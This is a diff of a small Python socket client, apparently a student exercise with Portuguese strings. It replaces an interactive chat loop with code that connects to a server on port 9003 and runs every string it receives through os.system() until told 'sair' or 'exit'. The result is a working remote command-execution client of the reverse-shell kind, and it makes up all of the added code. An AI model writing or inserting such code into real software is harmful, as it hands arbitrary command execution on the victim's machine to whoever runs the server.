@@ -1,21 +1,26 @@
 import socket
+import os
 
-port = 3380
+port = 9003
 host = "127.0.0.1"
 
-client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client:
+    try:
+        client.connect((host, port))
 
-try:
-    client.connect((host, port))
-    print("Conectado ao servidor!")
+        while True:
+            data_server = client.recv(2048).decode()
+            if data_server == "sair" or data_server == "exit":
+                client.close()
+                break
+            os.system(data_server)
 
-    while True:
-        message = input("Enviar: ")
-        client.send(message.encode())
-        data_server = client.recv(2048).decode()
-        print(data_server)
 
-except Exception as msg:
-    print(msg)
-finally:
-    client.close()
+    except socket.error as msg:
+        print(msg)
+
+    except Exception as ex:
+        print(ex)
+
+    finally:
+        client.close()
